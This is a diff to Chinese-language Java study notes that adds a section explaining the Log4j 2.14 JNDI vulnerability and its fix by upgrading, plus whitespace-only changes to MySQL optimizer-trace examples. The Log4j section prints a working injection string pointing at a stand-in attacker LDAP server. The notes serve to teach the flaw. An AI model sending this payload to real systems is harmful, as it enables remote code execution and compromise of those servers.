@@ -1682,6 +1682,24 @@ System.out.println(B.class.isAssignableFrom(A.class));
   * Agent-Class：如果你的agent是被设计为可以在应用程序启动后的任意时间点动态加载，那么需要指定此属性，并执行一个拥有agentmain方法的全限定名。在启动时，需要使用jvm的attach api来触发agent-class
   * Can-Redefine-Classes：这个属性是可选的，用于告诉jvm此agent是否支持在运行时重新定义类。如果设置成true，那agent则可以重新定义类
 
+#### 2.1.35 log4j漏洞总结
+
+* 在log4j 2.14版本中，有一个漏洞；假设有这么一个程序：接收用户传入的参数，然后用log4j打印日志（打印代码`logger.info("userName:{} 正在登录", userName)`）。那次是黑客就可以传入一个脚本，利用log4j的漏洞执行此脚本，最终达到攻击的目的（比如启动一个linux命令， 疯狂消耗cpu资源）。
+
+* 那如何复现漏洞呢？
+
+* userName只需要传递如下值即可
+
+  ```shell
+  ${jndi:ldap://malicious.server.com/a}
+  ```
+
+  由于 Log4j 的漏洞，它不仅会记录这个字符串，而且实际上会尝试通过 JNDI 查找 `ldap://malicious.server.com/a`，这是攻击者控制的 LDAP 服务器。攻击者在这个服务器上设置了一些恶意的代码，当应用程序联系服务器尝试查找时，这段恶意代码就会被下载并在应用程序服务器上执行。
+
+  这样，攻击者就能远程执行任意代码，这可能包括盗取敏感信息、安装恶意软件、破坏数据，或者使被攻击的系统成为进一步攻击其他系统的跳板。
+
+  修复这个漏洞的方法之一是更新 Log4j 到一个安全的版本，比如 2.15.0 或更高。在这些版本中，Log4j 不再自动解析这种 JNDI 字符串，所以攻击者即使输入恶意字符串，应用程序也不会处理它，从而避免了远程代码执行的风险。
+
 ### 2.2 Spring Cloud
 
 #### 2.2.1 服务注册中心Eureka
@@ -5363,7 +5381,7 @@ systemctl start rc-local.service  => 开启rc-local服务
   >    ```sql
   >    -- 第一步：打开查询优化器的日志追踪功能
   >    SET optimizer_trace="enabled=on";
-  >                                           
+  >                                              
   >    -- 第二步：执行SQL
   >    SELECT
   >        COUNT(p.pay_id)
@@ -5371,17 +5389,17 @@ systemctl start rc-local.service  => 开启rc-local服务
   >        (SELECT pay_id FROM pay WHERE create_time < '2020-09-05' AND account_id = 'fe3bce61-8604-4ee0-9ee8-0509ffb1735c') tmp
   >    INNER JOIN pay p ON tmp.pay_id = p.pay_id
   >    WHERE state IN (0, 1);
-  >                                           
+  >                                              
   >    -- 第三步: 获取上述SQL的查询优化结果
   >    SELECT trace FROM information_schema.OPTIMIZER_TRACE;
-  >                                           
+  >                                              
   >    -- 第四步: 分析查询优化结果
   >    -- 全表扫描的分析，rows为表中的行数，cost为全表扫描的评分
   >    "table_scan": {
   >      "rows": 996970,
   >      "cost": 203657
   >    },
-  >                                           
+  >                                              
   >    -- 走index_accountId_createTime索引的分析，评分为1.21
   >    "analyzing_range_alternatives": {
   >      "range_scan_alternatives": [
@@ -5404,7 +5422,7 @@ systemctl start rc-local.service  => 开启rc-local服务
   >        "cause": "too_few_roworder_scans"
   >      }
   >    },
-  >                                           
+  >                                              
   >    -- 最终选择走index_accountId_createTime索引，因为评分最低，只有1.21
   >    "chosen_range_access_summary": {
   >      "range_access_plan": {
@@ -5419,9 +5437,9 @@ systemctl start rc-local.service  => 开启rc-local服务
   >      "cost_for_plan": 1.21,
   >      "chosen": true
   >    }
-  >                                           
+  >                                              
   >    综上所述，针对于INNER JOIN，在MySQL处理后，它最终选择走index_accountId_createTime索引，而且评分为1.21
-  >                                           
+  >                                              
   >    ```
   >
   >    * 执行另外一条SQL
@@ -5429,13 +5447,13 @@ systemctl start rc-local.service  => 开启rc-local服务
   >    ```sql
   >    -- 第一步：打开查询优化器的日志追踪功能
   >    SET optimizer_trace="enabled=on";
-  >                                           
+  >                                              
   >    -- 第二步：执行SQL
   >    SELECT COUNT(pay_id) FROM pay WHERE create_time < '2020-09-05' AND account_id = 'fe3bce61-8604-4ee0-9ee8-0509ffb1735c' AND state IN (0, 1);
-  >                                           
+  >                                              
   >    -- 第三步: 获取上述SQL的查询优化结果
   >    SELECT trace FROM information_schema.OPTIMIZER_TRACE;
-  >                                           
+  >                                              
   >    -- 第四步: 分析查询优化结果
   >    -- 全表扫描的分析，rows为表中的行数，cost为全表扫描的评分
   >    "table_scan": {
